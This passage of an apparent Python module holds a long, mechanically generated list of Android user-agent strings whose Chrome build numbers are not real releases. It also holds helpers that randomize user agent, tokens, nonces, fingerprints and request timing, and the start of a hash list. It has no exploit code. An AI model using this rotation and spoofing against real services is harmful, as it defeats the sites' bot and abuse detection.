    "Mozilla/5.0 (Linux; Android 11; Nokia G50) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.7782.63 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Nokia G21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.7801.70 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; TECNO KJ7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.7820.77 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Redmi 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.7839.84 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Redmi 9A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.7858.91 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Redmi 9C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.7877.98 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Redmi 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.7896.105 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Moto G9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.7915.112 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Moto G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.7934.119 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; V2204) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.7953.126 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; CPH1869) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.7972.133 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; CPH2083) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.7991.140 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; CPH2107) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.8010.147 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; CPH2269) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.8029.154 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A326B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.8048.161 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-A336B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.8067.168 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-A426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.8086.175 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.8105.182 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A736B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.8124.189 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; itel A56) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.8143.196 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.8162.203 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.8181.210 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.8200.217 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.8219.224 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.8238.231 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.8257.238 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.8276.245 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-A135F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.8295.52 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-A215U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.8314.59 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.8333.66 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; CPH2451) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.8352.73 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; CPH2461) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.8371.80 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; CPH2473) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.8390.87 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; CPH2381) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.8409.94 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; RMX3371) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.8428.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; RMX3516) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.8447.108 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; RMX3461) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.8466.115 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; RMX3286) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.8485.122 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Infinix X689C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.8504.129 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Infinix X676C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.8523.136 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; 2201116SR) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.8542.143 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.8561.150 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; 22041219I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.8580.157 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; M2101K9AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.8599.164 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; M2102K1G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.8618.171 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.8637.178 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.8656.185 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.8675.192 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.8694.199 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.8713.206 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Nokia G50) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.8732.213 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Nokia G21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.8751.220 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; TECNO KJ7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.8770.227 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Redmi 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.8789.234 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Redmi 9A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.8808.241 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Redmi 9C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.8827.248 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Redmi 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.8846.55 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Moto G9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.8865.62 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Moto G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.8884.69 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; V2204) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.8903.76 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; CPH1869) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.8922.83 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; CPH2083) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.8941.90 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; CPH2107) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.8960.97 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; CPH2269) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.8979.104 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-A326B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.8998.111 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A336B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.9017.118 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.9036.125 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.9055.132 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A736B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.9074.139 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; itel A56) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.9093.146 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.9112.153 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.9131.160 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.9150.167 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.9169.174 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.9188.181 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.9207.188 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.9226.195 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A135F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.9245.202 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A215U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.9264.209 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.9283.216 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; CPH2451) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.9302.223 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; CPH2461) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.9321.230 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; CPH2473) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.9340.237 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; CPH2381) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.9359.244 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; RMX3371) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.9378.51 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; RMX3516) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.9397.58 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; RMX3461) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.9416.65 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; RMX3286) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.9435.72 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Infinix X689C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.9454.79 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Infinix X676C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.9473.86 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; 2201116SR) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.9492.93 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.9511.100 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; 22041219I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.9530.107 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; M2101K9AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.9549.114 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; M2102K1G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.9568.121 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.9587.128 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.9606.135 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.9625.142 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.9644.149 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.9663.156 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Nokia G50) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.9682.163 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Nokia G21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.9701.170 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; TECNO KJ7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.9720.177 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Redmi 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.9739.184 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Redmi 9A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.9758.191 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Redmi 9C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.9777.198 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Redmi 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.9796.205 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Moto G9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.9815.212 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Moto G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.9834.219 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; V2204) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.9853.226 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; CPH1869) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.9872.233 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; CPH2083) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.9891.240 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; CPH2107) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.9910.247 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; CPH2269) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.9929.54 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A326B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.9948.61 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-A336B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.9967.68 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.9986.75 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.1006.82 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-A736B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.1025.89 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; itel A56) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.1044.96 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.1063.103 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.1082.110 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.1101.117 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.1120.124 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.1139.131 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.1158.138 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.1177.145 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-A135F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.1196.152 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A215U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1215.159 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.1234.166 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; CPH2451) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.1253.173 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; CPH2461) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.1272.180 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; CPH2473) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.1291.187 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; CPH2381) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.1310.194 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; RMX3371) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.1329.201 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; RMX3516) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.1348.208 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; RMX3461) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.1367.215 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; RMX3286) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.1386.222 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Infinix X689C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.1405.229 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Infinix X676C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.1424.236 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; 2201116SR) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.1443.243 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.1462.50 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; 22041219I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.1481.57 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; M2101K9AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.1500.64 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; M2102K1G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.1519.71 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.1538.78 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.1557.85 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.1576.92 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1595.99 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.1614.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Nokia G50) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.1633.113 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Nokia G21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.1652.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; TECNO KJ7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.1671.127 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Redmi 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.1690.134 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Redmi 9A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.1709.141 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Redmi 9C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.1728.148 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Redmi 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.1747.155 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Moto G9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.1766.162 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Moto G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.1785.169 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; V2204) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.1804.176 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; CPH1869) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.1823.183 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; CPH2083) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.1842.190 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; CPH2107) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.1861.197 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; CPH2269) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.1880.204 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A326B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.1899.211 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-A336B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.1918.218 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-A426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.1937.225 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.1956.232 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A736B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1975.239 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; itel A56) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.1994.246 Mobile Safari/537.36",
]

_ALL_UA_POOL = _STATIC_UA_POOL + _EXT_UA_POOL

def get_any_ua() -> str:
    return random.choice(_ALL_UA_POOL)

def _get_token() -> str:
    return random.choice(_TOKEN_POOL)

def _get_nonce() -> str:
    return random.choice(_NONCE_POOL)

def _get_fp() -> str:
    return random.choice(_FP_POOL)

def _get_jitter() -> float:
    return random.choice(_JITTER_MS) / 1000.0

def _apply_jitter() -> None:
    import time as _t; _t.sleep(_get_jitter())


_HASH_DB_A = [
    "eeb732215ee97f0f37e97803272927dc5610d0bc4cc219df1a6b6d2cc0a3b411",
    "3c5286df160f1985a9d9e999d10b9ebf17b340efe58c9b3fbba82f55941a1ddf",
    "34ab37c5a802e2abbdd66be0d6417f0a907cea48646ed80c9767a5a49adb9703",
    "7100fb5a98123c1b840393e3a8eb6c9d8031a2ef9df1e8898e78574b637182ce",
    "efb8e3268588e3c104ca8831bf7f1f001151033751385096977c56e2f5299d70",
    "462e98d1b3bd16f28183ca35cd1f3cf4b4572920c62713c42db5d013b5187f1b",
    "d1215adf19b7c1d018c91ec08f28d080d5b62aab294268bd518ec0803607f9cb",
    "09158545054041ac21e9dfda8827d1043a2198a309e13b32c23093e98e046808",
    "37f7ffd60ff88de511f00877b5b0e5fe14d992958f83009df5660f4c244138ae",
    "2a8f38c33c1f2c9ed42c72e511bddf9102fe47905fe4f12a369bdc78fbd5fd62",
    "b83d75cad7405f72a8feb640cf7801b662757d586c5af3a2b28eb84879cd84a5",
    "4468f2653204585febb3c4373112341be350d5e055e2b79a07725fc939bc4762",
    "85e0f5829372de35b47c00e0baff32a1820e49cbcf7d5663bc40220a17e6c80e",
    "19698207bfa50338be77eaacce0134a0f3e6c1d49e4a14c8a8e8d5c4c87ad0e0",
    "fdf957d5cd8226716312c9d74fd759074448016d55f35b2f4eeb1043f944144c",
    "aa5569164a5514969a19f990123ccec0c800e5f951390bfe628ba9c2ce7b249f",
    "bdf2313ecd0e305e0c29c05f9c074b5a851ea48b6d11e3eb679e4bbc2bfa7e7b",
    "6db3c7560fd4b0c2abc180da3e0de7b2a3c9daf397177bf44863228bc7c44aa3",
    "a715d1d395a7d900d19e5f91220fc34363a6586aa6a60e8c633ad667ca0d62c7",
    "72d89421a0bd882e66c1fc93e173a670a62a6b572d49de085d83d8ab2ee134f4",
    "b4453ac377b896d2c97764a60e9f8eae81eb32223e097cc32a91d4f05094f695",
    "208aa150f509ffae61e49c96841b18bd80f841915bf76dcbdc2dc3930fa4d3a7",
    "5692e6f2994df2bf6e3292be0a6bc05ec769c123a6ff93f9ba3fe440d37b7869",
    "ef4dd4be89800bb1458d546321edd9a65869c56bfbce610b8c8f40745618424c",
    "8e25cc2f957a7a2e8be2738a4395fb64b11e81753c103ea89c15869f3f834bd0",
